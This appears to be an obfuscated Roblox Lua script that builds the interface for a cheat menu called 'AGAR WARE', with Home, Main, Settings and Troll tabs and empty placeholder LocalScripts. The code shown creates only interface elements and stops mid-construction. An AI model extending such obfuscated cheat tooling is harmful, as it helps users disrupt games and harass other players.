local _sc=string.char;
local _llza={};
_llza[_sc(49)]=Instance.new(_sc(83,99,114,101,101,110,71,117,105),game:GetService(_sc(80,108,97,121,101,114,115)).LocalPlayer:WaitForChild(_sc(80,108,97,121,101,114,71,117,105)));
_llza[_sc(49)][_sc(68,105,115,112,108,97,121,79,114,100,101,114)]=1999999999;
_llza[_sc(49)][_sc(78,97,109,101)]=[[T5784YHRGE89ES98T]];
_llza[_sc(49)][_sc(90,73,110,100,101,120,66,101,104,97,118,105,111,114)]=Enum.ZIndexBehavior.Sibling;
_llza[_sc(50)]=Instance.new(_sc(76,111,99,97,108,83,99,114,105,112,116),_llza[_sc(49)]);
_llza[_sc(50)][_sc(78,97,109,101)]=_sc(109,97,105,110,83,99,114,105,112,116);
_llza[_sc(51)]=Instance.new(_sc(76,111,99,97,108,83,99,114,105,112,116),_llza[_sc(49)]);
_llza[_sc(51)][_sc(78,97,109,101)]=_sc(103,117,105,99,111,108,111,114);
_llza[_sc(52)]=Instance.new(_sc(76,111,99,97,108,83,99,114,105,112,116),_llza[_sc(49)]);
_llza[_sc(52)][_sc(78,97,109,101)]=_sc(115,116,97,114,116,117,112,83,99,114,105,112,116);
_llza[_sc(53)]=Instance.new(_sc(76,111,99,97,108,83,99,114,105,112,116),_llza[_sc(49)]);
_llza[_sc(53)][_sc(78,97,109,101)]=_sc(46);
_llza[_sc(54)]=Instance.new(_sc(70,114,97,109,101),_llza[_sc(49)]);
_llza[_sc(54)][_sc(90,73,110,100,101,120)]=1000000000;
_llza[_sc(54)][_sc(83,105,122,101)]=UDim2.new(0, 450, 0, 300);
_llza[_sc(54)][_sc(66,111,114,100,101,114,67,111,108,111,114,51)]=Color3.fromRGB(0, 0, 0);
_llza[_sc(54)][_sc(78,97,109,101)]=[[MainFrame]];
_llza[_sc(54)][_sc(66,111,114,100,101,114,83,105,122,101,80,105,120,101,108)]=0;
_llza[_sc(54)][_sc(80,111,115,105,116,105,111,110)]=UDim2.new(0.25851, 0, 0.16374, 0);
_llza[_sc(54)][_sc(66,97,99,107,103,114,111,117,110,100,67,111,108,111,114,51)]=Color3.fromRGB(26, 26, 26);
_llza[_sc(55)]=Instance.new(_sc(84,101,120,116,76,97,98,101,108),_llza[_sc(54)]);
_llza[_sc(55)][_sc(86,105,115,105,98,108,101)]=false;
_llza[_sc(55)][_sc(66,111,114,100,101,114,83,105,122,101,80,105,120,101,108)]=0;
_llza[_sc(55)][_sc(66,97,99,107,103,114,111,117,110,100,67,111,108,111,114,51)]=Color3.fromRGB(255, 255, 255);
_llza[_sc(55)][_sc(70,111,110,116,70,97,99,101)]=Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
_llza[_sc(55)][_sc(84,101,120,116,84,114,97,110,115,112,97,114,101,110,99,121)]=1;
_llza[_sc(55)][_sc(84,101,120,116,83,105,122,101)]=14;
_llza[_sc(55)][_sc(83,105,122,101)]=UDim2.new(0, 200, 0, 50);
_llza[_sc(55)][_sc(84,101,120,116,67,111,108,111,114,51)]=Color3.fromRGB(0, 0, 0);
_llza[_sc(55)][_sc(66,111,114,100,101,114,67,111,108,111,114,51)]=Color3.fromRGB(0, 0, 0);
_llza[_sc(55)][_sc(66,97,99,107,103,114,111,117,110,100,84,114,97,110,115,112,97,114,101,110,99,121)]=1;
_llza[_sc(55)][_sc(78,97,109,101)]=[[itsthisone]];
_llza[_sc(56)]=Instance.new(_sc(85,73,83,116,114,111,107,101),_llza[_sc(54)]);
_llza[_sc(56)][_sc(67,111,108,111,114)]=Color3.fromRGB(0, 124, 255);
_llza[_sc(56)][_sc(78,97,109,101)]=[[GuiColor]];
_llza[_sc(56)][_sc(65,112,112,108,121,83,116,114,111,107,101,77,111,100,101)]=Enum.ApplyStrokeMode.Border;
_llza[_sc(56)][_sc(90,73,110,100,101,120)]=99;
_llza[_sc(57)]=Instance.new(_sc(85,73,83,116,114,111,107,101),_llza[_sc(54)]);
_llza[_sc(57)][_sc(84,104,105,99,107,110,101,115,115)]=2;
_llza[_sc(57)][_sc(78,97,109,101)]=[[blackstroke]];
_llza[_sc(57)][_sc(65,112,112,108,121,83,116,114,111,107,101,77,111,100,101)]=Enum.ApplyStrokeMode.Border;
_llza[_sc(97)]=Instance.new(_sc(70,114,97,109,101),_llza[_sc(54)]);
_llza[_sc(97)][_sc(90,73,110,100,101,120)]=99;
_llza[_sc(97)][_sc(83,105,122,101)]=UDim2.new(0, 450, 0, 20);
_llza[_sc(97)][_sc(66,111,114,100,101,114,67,111,108,111,114,51)]=Color3.fromRGB(0, 0, 0);
_llza[_sc(97)][_sc(78,97,109,101)]=[[topbar]];
_llza[_sc(97)][_sc(66,111,114,100,101,114,83,105,122,101,80,105,120,101,108)]=0;
_llza[_sc(97)][_sc(66,97,99,107,103,114,111,117,110,100,84,114,97,110,115,112,97,114,101,110,99,121)]=1;
_llza[_sc(97)][_sc(66,97,99,107,103,114,111,117,110,100,67,111,108,111,114,51)]=Color3.fromRGB(255, 255, 255);
_llza[_sc(98)]=Instance.new(_sc(76,111,99,97,108,83,99,114,105,112,116),_llza[_sc(97)]);
_llza[_sc(98)][_sc(78,97,109,101)]=_sc(116,111,112,98,97,114,83,99,114,105,112,116);
_llza[_sc(99)]=Instance.new(_sc(84,101,120,116,76,97,98,101,108),_llza[_sc(97)]);
_llza[_sc(99)][_sc(66,111,114,100,101,114,83,105,122,101,80,105,120,101,108)]=0;
_llza[_sc(99)][_sc(82,105,99,104,84,101,120,116)]=true;
_llza[_sc(99)][_sc(66,97,99,107,103,114,111,117,110,100,67,111,108,111,114,51)]=Color3.fromRGB(255, 255, 255);
_llza[_sc(99)][_sc(70,111,110,116,70,97,99,101)]=Font.new([[rbxasset://fonts/families/Inconsolata.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
_llza[_sc(99)][_sc(84,101,120,116,88,65,108,105,103,110,109,101,110,116)]=Enum.TextXAlignment.Left;
_llza[_sc(99)][_sc(84,101,120,116,83,105,122,101)]=11;
_llza[_sc(99)][_sc(83,105,122,101)]=UDim2.new(1, 0, 1, 0);
_llza[_sc(99)][_sc(84,101,120,116,67,111,108,111,114,51)]=Color3.fromRGB(255, 255, 255);
_llza[_sc(99)][_sc(66,111,114,100,101,114,67,111,108,111,114,51)]=Color3.fromRGB(0, 0, 0);
_llza[_sc(99)][_sc(84,101,120,116)]=[[AGAR WARE | v3.0.0 | fps X.X | Xms | server: X/X]];
_llza[_sc(99)][_sc(66,97,99,107,103,114,111,117,110,100,84,114,97,110,115,112,97,114,101,110,99,121)]=1;
_llza[_sc(99)][_sc(78,97,109,101)]=[[text]];
_llza[_sc(100)]=Instance.new(_sc(85,73,83,116,114,111,107,101),_llza[_sc(99)]);
_llza[_sc(100)][_sc(78,97,109,101)]=[[text]];
_llza[_sc(101)]=Instance.new(_sc(85,73,80,97,100,100,105,110,103),_llza[_sc(97)]);
_llza[_sc(101)][_sc(80,97,100,100,105,110,103,76,101,102,116)]=UDim.new(0, 7);
_llza[_sc(102)]=Instance.new(_sc(84,101,120,116,66,117,116,116,111,110),_llza[_sc(97)]);
_llza[_sc(102)][_sc(90,73,110,100,101,120)]=9999;
_llza[_sc(102)][_sc(66,111,114,100,101,114,83,105,122,101,80,105,120,101,108)]=0;
_llza[_sc(102)][_sc(66,97,99,107,103,114,111,117,110,100,67,111,108,111,114,51)]=Color3.fromRGB(255, 255, 255);
_llza[_sc(102)][_sc(70,111,110,116,70,97,99,101)]=Font.new([[rbxasset://fonts/families/Inconsolata.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
_llza[_sc(102)][_sc(84,101,120,116,83,116,114,111,107,101,67,111,108,111,114,51)]=Color3.fromRGB(255, 255, 255);
_llza[_sc(102)][_sc(84,101,120,116,83,105,122,101)]=14;
_llza[_sc(102)][_sc(84,101,120,116,67,111,108,111,114,51)]=Color3.fromRGB(255, 255, 255);
_llza[_sc(102)][_sc(83,105,122,101)]=UDim2.new(0, 60, 0, 20);
_llza[_sc(102)][_sc(66,111,114,100,101,114,67,111,108,111,114,51)]=Color3.fromRGB(0, 0, 0);
_llza[_sc(102)][_sc(84,101,120,116)]=[[-]];
_llza[_sc(102)][_sc(66,97,99,107,103,114,111,117,110,100,84,114,97,110,115,112,97,114,101,110,99,121)]=1;
_llza[_sc(102)][_sc(80,111,115,105,116,105,111,110)]=UDim2.new(0.86451, 0, 0, 0);
_llza[_sc(102)][_sc(78,97,109,101)]=[[minimise]];
_llza[_sc(49,48)]=Instance.new(_sc(85,73,83,116,114,111,107,101),_llza[_sc(102)]);
_llza[_sc(49,48)][_sc(78,97,109,101)]=[[text]];
_llza[_sc(49,49)]=Instance.new(_sc(70,114,97,109,101),_llza[_sc(54)]);
_llza[_sc(49,49)][_sc(83,105,122,101)]=UDim2.new(0, 440, 0, 275);
_llza[_sc(49,49)][_sc(66,111,114,100,101,114,67,111,108,111,114,51)]=Color3.fromRGB(0, 0, 0);
_llza[_sc(49,49)][_sc(78,97,109,101)]=[[innerframe]];
_llza[_sc(49,49)][_sc(66,111,114,100,101,114,83,105,122,101,80,105,120,101,108)]=0;
_llza[_sc(49,49)][_sc(80,111,115,105,116,105,111,110)]=UDim2.new(0, 5, 0, 20);
_llza[_sc(49,49)][_sc(66,97,99,107,103,114,111,117,110,100,67,111,108,111,114,51)]=Color3.fromRGB(11, 11, 11);
_llza[_sc(49,50)]=Instance.new(_sc(85,73,83,116,114,111,107,101),_llza[_sc(49,49)]);
_llza[_sc(49,50)][_sc(67,111,108,111,114)]=Color3.fromRGB(51, 51, 51);
_llza[_sc(49,50)][_sc(78,97,109,101)]=[[greystroke]];
_llza[_sc(49,50)][_sc(65,112,112,108,121,83,116,114,111,107,101,77,111,100,101)]=Enum.ApplyStrokeMode.Border;
_llza[_sc(49,50)][_sc(90,73,110,100,101,120)]=99;
_llza[_sc(49,51)]=Instance.new(_sc(70,114,97,109,101),_llza[_sc(49,49)]);
_llza[_sc(49,51)][_sc(83,105,122,101)]=UDim2.new(0, 60, 0, 265);
_llza[_sc(49,51)][_sc(66,111,114,100,101,114,67,111,108,111,114,51)]=Color3.fromRGB(0, 0, 0);
_llza[_sc(49,51)][_sc(78,97,109,101)]=[[sidebar]];
_llza[_sc(49,51)][_sc(66,111,114,100,101,114,83,105,122,101,80,105,120,101,108)]=0;
_llza[_sc(49,51)][_sc(80,111,115,105,116,105,111,110)]=UDim2.new(0, 5, 0, 5);
_llza[_sc(49,51)][_sc(66,97,99,107,103,114,111,117,110,100,67,111,108,111,114,51)]=Color3.fromRGB(11, 11, 11);
_llza[_sc(49,52)]=Instance.new(_sc(85,73,83,116,114,111,107,101),_llza[_sc(49,51)]);
_llza[_sc(49,52)][_sc(67,111,108,111,114)]=Color3.fromRGB(51, 51, 51);
_llza[_sc(49,52)][_sc(78,97,109,101)]=[[greystroke]];
_llza[_sc(49,52)][_sc(65,112,112,108,121,83,116,114,111,107,101,77,111,100,101)]=Enum.ApplyStrokeMode.Border;
_llza[_sc(49,53)]=Instance.new(_sc(83,99,114,111,108,108,105,110,103,70,114,97,109,101),_llza[_sc(49,51)]);
_llza[_sc(49,53)][_sc(66,111,114,100,101,114,83,105,122,101,80,105,120,101,108)]=0;
_llza[_sc(49,53)][_sc(66,97,99,107,103,114,111,117,110,100,67,111,108,111,114,51)]=Color3.fromRGB(255, 255, 255);
_llza[_sc(49,53)][_sc(83,99,114,111,108,108,105,110,103,69,110,97,98,108,101,100)]=false;
_llza[_sc(49,53)][_sc(78,97,109,101)]=[[sidebarScrolling]];
_llza[_sc(49,53)][_sc(83,105,122,101)]=UDim2.new(0, 60, 0, 265);
_llza[_sc(49,53)][_sc(83,99,114,111,108,108,66,97,114,73,109,97,103,101,67,111,108,111,114,51)]=Color3.fromRGB(0, 0, 0);
_llza[_sc(49,53)][_sc(66,111,114,100,101,114,67,111,108,111,114,51)]=Color3.fromRGB(0, 0, 0);
_llza[_sc(49,53)][_sc(83,99,114,111,108,108,66,97,114,84,104,105,99,107,110,101,115,115)]=0;
_llza[_sc(49,53)][_sc(65,99,116,105,118,101)]=true;
_llza[_sc(49,53)][_sc(66,97,99,107,103,114,111,117,110,100,84,114,97,110,115,112,97,114,101,110,99,121)]=1;
_llza[_sc(49,54)]=Instance.new(_sc(76,111,99,97,108,83,99,114,105,112,116),_llza[_sc(49,53)]);
_llza[_sc(49,54)][_sc(78,97,109,101)]=_sc(112,97,103,101,104,97,110,100,108,101,114);
_llza[_sc(49,55)]=Instance.new(_sc(84,101,120,116,66,117,116,116,111,110),_llza[_sc(49,53)]);
_llza[_sc(49,55)][_sc(66,111,114,100,101,114,83,105,122,101,80,105,120,101,108)]=0;
_llza[_sc(49,55)][_sc(66,97,99,107,103,114,111,117,110,100,67,111,108,111,114,51)]=Color3.fromRGB(11, 11, 11);
_llza[_sc(49,55)][_sc(70,111,110,116,70,97,99,101)]=Font.new([[rbxasset://fonts/families/Inconsolata.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
_llza[_sc(49,55)][_sc(84,101,120,116,84,114,97,110,115,112,97,114,101,110,99,121)]=1;
_llza[_sc(49,55)][_sc(84,101,120,116,83,105,122,101)]=14;
_llza[_sc(49,55)][_sc(84,101,120,116,67,111,108,111,114,51)]=Color3.fromRGB(255, 255, 255);
_llza[_sc(49,55)][_sc(83,105,122,101)]=UDim2.new(0, 60, 0, 22);
_llza[_sc(49,55)][_sc(66,111,114,100,101,114,67,111,108,111,114,51)]=Color3.fromRGB(0, 0, 0);
_llza[_sc(49,55)][_sc(84,101,120,116)]=[[]];
_llza[_sc(49,55)][_sc(78,97,109,101)]=[[Home]];
_llza[_sc(49,56)]=Instance.new(_sc(85,73,83,116,114,111,107,101),_llza[_sc(49,55)]);
_llza[_sc(49,56)][_sc(67,111,108,111,114)]=Color3.fromRGB(51, 51, 51);
_llza[_sc(49,56)][_sc(78,97,109,101)]=[[greystroke]];
_llza[_sc(49,56)][_sc(65,112,112,108,121,83,116,114,111,107,101,77,111,100,101)]=Enum.ApplyStrokeMode.Border;
_llza[_sc(49,57)]=Instance.new(_sc(84,101,120,116,76,97,98,101,108),_llza[_sc(49,55)]);
_llza[_sc(49,57)][_sc(66,111,114,100,101,114,83,105,122,101,80,105,120,101,108)]=0;
_llza[_sc(49,57)][_sc(66,97,99,107,103,114,111,117,110,100,67,111,108,111,114,51)]=Color3.fromRGB(255, 255, 255);
_llza[_sc(49,57)][_sc(70,111,110,116,70,97,99,101)]=Font.new([[rbxasset://fonts/families/Inconsolata.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
_llza[_sc(49,57)][_sc(84,101,120,116,83,105,122,101)]=12;
_llza[_sc(49,57)][_sc(83,105,122,101)]=UDim2.new(1, 0, 1, 0);
_llza[_sc(49,57)][_sc(84,101,120,116,67,111,108,111,114,51)]=Color3.fromRGB(255, 255, 255);
_llza[_sc(49,57)][_sc(66,111,114,100,101,114,67,111,108,111,114,51)]=Color3.fromRGB(0, 0, 0);
_llza[_sc(49,57)][_sc(84,101,120,116)]=[[Home]];
_llza[_sc(49,57)][_sc(66,97,99,107,103,114,111,117,110,100,84,114,97,110,115,112,97,114,101,110,99,121)]=1;
_llza[_sc(49,57)][_sc(90,73,110,100,101,120)]=2;
_llza[_sc(49,57)][_sc(78,97,109,101)]=[[text]];
_llza[_sc(49,97)]=Instance.new(_sc(85,73,83,116,114,111,107,101),_llza[_sc(49,57)]);
_llza[_sc(49,97)][_sc(78,97,109,101)]=[[text]];
_llza[_sc(49,98)]=Instance.new(_sc(67,97,110,118,97,115,71,114,111,117,112),_llza[_sc(49,55)]);
_llza[_sc(49,98)][_sc(71,114,111,117,112,67,111,108,111,114,51)]=Color3.fromRGB(0, 0, 0);
_llza[_sc(49,98)][_sc(83,105,122,101)]=UDim2.new(1, 0, 1, 0);
_llza[_sc(49,98)][_sc(66,111,114,100,101,114,67,111,108,111,114,51)]=Color3.fromRGB(0, 0, 0);
_llza[_sc(49,98)][_sc(78,97,109,101)]=[[buttonFade]];
_llza[_sc(49,98)][_sc(66,111,114,100,101,114,83,105,122,101,80,105,120,101,108)]=0;
_llza[_sc(49,98)][_sc(66,97,99,107,103,114,111,117,110,100,67,111,108,111,114,51)]=Color3.fromRGB(255, 255, 255);
_llza[_sc(49,99)]=Instance.new(_sc(85,73,71,114,97,100,105,101,110,116),_llza[_sc(49,98)]);
_llza[_sc(49,99)][_sc(84,114,97,110,115,112,97,114,101,110,99,121)]=NumberSequence.new{NumberSequenceKeypoint.new(0.000, 1), NumberSequenceKeypoint.new(1.000, 0.7)};
_llza[_sc(49,99)][_sc(82,111,116,97,116,105,111,110)]=90;
_llza[_sc(49,100)]=Instance.new(_sc(85,73,76,105,115,116,76,97,121,111,117,116),_llza[_sc(49,53)]);
_llza[_sc(49,100)][_sc(83,111,114,116,79,114,100,101,114)]=Enum.SortOrder.LayoutOrder;
_llza[_sc(49,101)]=Instance.new(_sc(84,101,120,116,66,117,116,116,111,110),_llza[_sc(49,53)]);
_llza[_sc(49,101)][_sc(76,97,121,111,117,116,79,114,100,101,114)]=2;
_llza[_sc(49,101)][_sc(66,111,114,100,101,114,83,105,122,101,80,105,120,101,108)]=0;
_llza[_sc(49,101)][_sc(66,97,99,107,103,114,111,117,110,100,67,111,108,111,114,51)]=Color3.fromRGB(11, 11, 11);
_llza[_sc(49,101)][_sc(70,111,110,116,70,97,99,101)]=Font.new([[rbxasset://fonts/families/Inconsolata.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
_llza[_sc(49,101)][_sc(84,101,120,116,84,114,97,110,115,112,97,114,101,110,99,121)]=1;
_llza[_sc(49,101)][_sc(84,101,120,116,83,105,122,101)]=14;
_llza[_sc(49,101)][_sc(84,101,120,116,67,111,108,111,114,51)]=Color3.fromRGB(255, 255, 255);
_llza[_sc(49,101)][_sc(83,105,122,101)]=UDim2.new(0, 60, 0, 22);
_llza[_sc(49,101)][_sc(66,111,114,100,101,114,67,111,108,111,114,51)]=Color3.fromRGB(0, 0, 0);
_llza[_sc(49,101)][_sc(84,101,120,116)]=[[]];
_llza[_sc(49,101)][_sc(78,97,109,101)]=[[Main]];
_llza[_sc(49,102)]=Instance.new(_sc(85,73,83,116,114,111,107,101),_llza[_sc(49,101)]);
_llza[_sc(49,102)][_sc(67,111,108,111,114)]=Color3.fromRGB(51, 51, 51);
_llza[_sc(49,102)][_sc(78,97,109,101)]=[[greystroke]];
_llza[_sc(49,102)][_sc(65,112,112,108,121,83,116,114,111,107,101,77,111,100,101)]=Enum.ApplyStrokeMode.Border;
_llza[_sc(50,48)]=Instance.new(_sc(84,101,120,116,76,97,98,101,108),_llza[_sc(49,101)]);
_llza[_sc(50,48)][_sc(66,111,114,100,101,114,83,105,122,101,80,105,120,101,108)]=0;
_llza[_sc(50,48)][_sc(66,97,99,107,103,114,111,117,110,100,67,111,108,111,114,51)]=Color3.fromRGB(255, 255, 255);
_llza[_sc(50,48)][_sc(70,111,110,116,70,97,99,101)]=Font.new([[rbxasset://fonts/families/Inconsolata.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
_llza[_sc(50,48)][_sc(84,101,120,116,83,105,122,101)]=12;
_llza[_sc(50,48)][_sc(83,105,122,101)]=UDim2.new(1, 0, 1, 0);
_llza[_sc(50,48)][_sc(84,101,120,116,67,111,108,111,114,51)]=Color3.fromRGB(255, 255, 255);
_llza[_sc(50,48)][_sc(66,111,114,100,101,114,67,111,108,111,114,51)]=Color3.fromRGB(0, 0, 0);
_llza[_sc(50,48)][_sc(84,101,120,116)]=[[Main]];
_llza[_sc(50,48)][_sc(66,97,99,107,103,114,111,117,110,100,84,114,97,110,115,112,97,114,101,110,99,121)]=1;
_llza[_sc(50,48)][_sc(90,73,110,100,101,120)]=2;
_llza[_sc(50,48)][_sc(78,97,109,101)]=[[text]];
_llza[_sc(50,49)]=Instance.new(_sc(85,73,83,116,114,111,107,101),_llza[_sc(50,48)]);
_llza[_sc(50,49)][_sc(78,97,109,101)]=[[text]];
_llza[_sc(50,50)]=Instance.new(_sc(67,97,110,118,97,115,71,114,111,117,112),_llza[_sc(49,101)]);
_llza[_sc(50,50)][_sc(71,114,111,117,112,67,111,108,111,114,51)]=Color3.fromRGB(0, 0, 0);
_llza[_sc(50,50)][_sc(83,105,122,101)]=UDim2.new(1, 0, 1, 0);
_llza[_sc(50,50)][_sc(66,111,114,100,101,114,67,111,108,111,114,51)]=Color3.fromRGB(0, 0, 0);
_llza[_sc(50,50)][_sc(78,97,109,101)]=[[buttonFade]];
_llza[_sc(50,50)][_sc(66,111,114,100,101,114,83,105,122,101,80,105,120,101,108)]=0;
_llza[_sc(50,50)][_sc(66,97,99,107,103,114,111,117,110,100,67,111,108,111,114,51)]=Color3.fromRGB(255, 255, 255);
_llza[_sc(50,51)]=Instance.new(_sc(85,73,71,114,97,100,105,101,110,116),_llza[_sc(50,50)]);
_llza[_sc(50,51)][_sc(84,114,97,110,115,112,97,114,101,110,99,121)]=NumberSequence.new{NumberSequenceKeypoint.new(0.000, 1), NumberSequenceKeypoint.new(1.000, 0.7)};
_llza[_sc(50,51)][_sc(82,111,116,97,116,105,111,110)]=90;
_llza[_sc(50,52)]=Instance.new(_sc(84,101,120,116,66,117,116,116,111,110),_llza[_sc(49,53)]);
_llza[_sc(50,52)][_sc(76,97,121,111,117,116,79,114,100,101,114)]=1;
_llza[_sc(50,52)][_sc(66,111,114,100,101,114,83,105,122,101,80,105,120,101,108)]=0;
_llza[_sc(50,52)][_sc(66,97,99,107,103,114,111,117,110,100,67,111,108,111,114,51)]=Color3.fromRGB(11, 11, 11);
_llza[_sc(50,52)][_sc(70,111,110,116,70,97,99,101)]=Font.new([[rbxasset://fonts/families/Inconsolata.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
_llza[_sc(50,52)][_sc(84,101,120,116,84,114,97,110,115,112,97,114,101,110,99,121)]=1;
_llza[_sc(50,52)][_sc(84,101,120,116,83,105,122,101)]=14;
_llza[_sc(50,52)][_sc(84,101,120,116,67,111,108,111,114,51)]=Color3.fromRGB(255, 255, 255);
_llza[_sc(50,52)][_sc(83,105,122,101)]=UDim2.new(0, 60, 0, 22);
_llza[_sc(50,52)][_sc(66,111,114,100,101,114,67,111,108,111,114,51)]=Color3.fromRGB(0, 0, 0);
_llza[_sc(50,52)][_sc(84,101,120,116)]=[[]];
_llza[_sc(50,52)][_sc(78,97,109,101)]=[[Settings]];
_llza[_sc(50,53)]=Instance.new(_sc(85,73,83,116,114,111,107,101),_llza[_sc(50,52)]);
_llza[_sc(50,53)][_sc(67,111,108,111,114)]=Color3.fromRGB(51, 51, 51);
_llza[_sc(50,53)][_sc(78,97,109,101)]=[[greystroke]];
_llza[_sc(50,53)][_sc(65,112,112,108,121,83,116,114,111,107,101,77,111,100,101)]=Enum.ApplyStrokeMode.Border;
_llza[_sc(50,54)]=Instance.new(_sc(84,101,120,116,76,97,98,101,108),_llza[_sc(50,52)]);
_llza[_sc(50,54)][_sc(66,111,114,100,101,114,83,105,122,101,80,105,120,101,108)]=0;
_llza[_sc(50,54)][_sc(66,97,99,107,103,114,111,117,110,100,67,111,108,111,114,51)]=Color3.fromRGB(255, 255, 255);
_llza[_sc(50,54)][_sc(70,111,110,116,70,97,99,101)]=Font.new([[rbxasset://fonts/families/Inconsolata.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
_llza[_sc(50,54)][_sc(84,101,120,116,83,105,122,101)]=12;
_llza[_sc(50,54)][_sc(83,105,122,101)]=UDim2.new(1, 0, 1, 0);
_llza[_sc(50,54)][_sc(84,101,120,116,67,111,108,111,114,51)]=Color3.fromRGB(255, 255, 255);
_llza[_sc(50,54)][_sc(66,111,114,100,101,114,67,111,108,111,114,51)]=Color3.fromRGB(0, 0, 0);
_llza[_sc(50,54)][_sc(84,101,120,116)]=[[Settings]];
_llza[_sc(50,54)][_sc(66,97,99,107,103,114,111,117,110,100,84,114,97,110,115,112,97,114,101,110,99,121)]=1;
_llza[_sc(50,54)][_sc(90,73,110,100,101,120)]=2;
_llza[_sc(50,54)][_sc(78,97,109,101)]=[[text]];
_llza[_sc(50,55)]=Instance.new(_sc(85,73,83,116,114,111,107,101),_llza[_sc(50,54)]);
_llza[_sc(50,55)][_sc(78,97,109,101)]=[[text]];
_llza[_sc(50,56)]=Instance.new(_sc(67,97,110,118,97,115,71,114,111,117,112),_llza[_sc(50,52)]);
_llza[_sc(50,56)][_sc(71,114,111,117,112,67,111,108,111,114,51)]=Color3.fromRGB(0, 0, 0);
_llza[_sc(50,56)][_sc(83,105,122,101)]=UDim2.new(1, 0, 1, 0);
_llza[_sc(50,56)][_sc(66,111,114,100,101,114,67,111,108,111,114,51)]=Color3.fromRGB(0, 0, 0);
_llza[_sc(50,56)][_sc(78,97,109,101)]=[[buttonFade]];
_llza[_sc(50,56)][_sc(66,111,114,100,101,114,83,105,122,101,80,105,120,101,108)]=0;
_llza[_sc(50,56)][_sc(66,97,99,107,103,114,111,117,110,100,67,111,108,111,114,51)]=Color3.fromRGB(255, 255, 255);
_llza[_sc(50,57)]=Instance.new(_sc(85,73,71,114,97,100,105,101,110,116),_llza[_sc(50,56)]);
_llza[_sc(50,57)][_sc(84,114,97,110,115,112,97,114,101,110,99,121)]=NumberSequence.new{NumberSequenceKeypoint.new(0.000, 1), NumberSequenceKeypoint.new(1.000, 0.7)};
_llza[_sc(50,57)][_sc(82,111,116,97,116,105,111,110)]=90;
_llza[_sc(50,97)]=Instance.new(_sc(84,101,120,116,66,117,116,116,111,110),_llza[_sc(49,53)]);
_llza[_sc(50,97)][_sc(76,97,121,111,117,116,79,114,100,101,114)]=3;
_llza[_sc(50,97)][_sc(66,111,114,100,101,114,83,105,122,101,80,105,120,101,108)]=0;
_llza[_sc(50,97)][_sc(66,97,99,107,103,114,111,117,110,100,67,111,108,111,114,51)]=Color3.fromRGB(11, 11, 11);
_llza[_sc(50,97)][_sc(70,111,110,116,70,97,99,101)]=Font.new([[rbxasset://fonts/families/Inconsolata.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
_llza[_sc(50,97)][_sc(84,101,120,116,84,114,97,110,115,112,97,114,101,110,99,121)]=1;
_llza[_sc(50,97)][_sc(84,101,120,116,83,105,122,101)]=14;
_llza[_sc(50,97)][_sc(84,101,120,116,67,111,108,111,114,51)]=Color3.fromRGB(255, 255, 255);
_llza[_sc(50,97)][_sc(83,105,122,101)]=UDim2.new(0, 60, 0, 22);
_llza[_sc(50,97)][_sc(66,111,114,100,101,114,67,111,108,111,114,51)]=Color3.fromRGB(0, 0, 0);
_llza[_sc(50,97)][_sc(84,101,120,116)]=[[]];
_llza[_sc(50,97)][_sc(78,97,109,101)]=[[Troll]];
_llza[_sc(50,98)]=Instance.new(_sc(85,73,83,116,114,111,107,101),_llza[_sc(50,97)]);
_llza[_sc(50,98)][_sc(67,111,108,111,114)]=Color3.fromRGB(51, 51, 51);
_llza[_sc(50,98)][_sc(78,97,109,101)]=[[greystroke]];
_llza[_sc(50,98)][_sc(65,112,112,108,121,83,116,114,111,107,101,77,111,100,101)]=Enum.ApplyStrokeMode.Border;
_llza[_sc(50,99)]=Instance.new(_sc(84,101,120,116,76,97,98,101,108),_llza[_sc(50,97)]);
_llza[_sc(50,99)][_sc(66,111,114,100,101,114,83,105,122,101,80,105,120,101,108)]=0;
_llza[_sc(50,99)][_sc(66,97,99,107,103,114,111,117,110,100,67,111,108,111,114,51)]=Color3.fromRGB(255, 255, 255);
_llza[_sc(50,99)][_sc(70,111,110,116,70,97,99,101)]=Font.new([[rbxasset://fonts/families/Inconsolata.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
_llza[_sc(50,99)][_sc(84,101,120,116,83,105,122,101)]=12;
_llza[_sc(50,99)][_sc(83,105,122,101)]=UDim2.new(1, 0, 1, 0);
_llza[_sc(50,99)][_sc(84,101,120,116,67,111,108,111,114,51)]=Color3.fromRGB(255, 255, 255);
_llza[_sc(50,99)][_sc(66,111,114,100,101,114,67,111,108,111,114,51)]=Color3.fromRGB(0, 0, 0);
_llza[_sc(50,99)][_sc(84,101,120,116)]=[[Troll]];
_llza[_sc(50,99)][_sc(66,97,99,107,103,114,111,117,110,100,84,114,97,110,115,112,97,114,101,110,99,121)]=1;
_llza[_sc(50,99)][_sc(90,73,110,100,101,120)]=2;
_llza[_sc(50,99)][_sc(78,97,109,101)]=[[text]];
_llza[_sc(50,100)]=Instance.new(_sc(85,73,83,116,114,111,107,101),_llza[_sc(50,99)]);
_llza[_sc(50,100)][_sc(78,97,109,101)]=[[text]];
_llza[_sc(50,101)]=Instance.new(_sc(67,97,110,118,97,115,71,114,111,117,112),_llza[_sc(50,97)]);
_llza[_sc(50,101)][_sc(71,114,111,117,112,67,111,108,111,114,51)]=Color3.fromRGB(0, 0, 0);
_llza[_sc(50,101)][_sc(83,105,122,101)]=UDim2.new(1, 0, 1, 0);
_llza[_sc(50,101)][_sc(66,111,114,100,101,114,67,111,108,111,114,51)]=Color3.fromRGB(0, 0, 0);
_llza[_sc(50,101)][_sc(78,97,109,101)]=[[buttonFade]];
_llza[_sc(50,101)][_sc(66,111,114,100,101,114,83,105,122,101,80,105,120,101,108)]=0;
_llza[_sc(50,101)][_sc(66,97,99,107,103,114,111,117,110,100,67,111,108,111,114,51)]=Color3.fromRGB(255, 255, 255);
_llza[_sc(50,102)]=Instance.new(_sc(85,73,71,114,97,100,105,101,110,116),_llza[_sc(50,101)]);
_llza[_sc(50,102)][_sc(84,114,97,110,115,112,97,114,101,110,99,121)]=NumberSequence.new{NumberSequenceKeypoint.new(0.000, 1), NumberSequenceKeypoint.new(1.000, 0.7)};
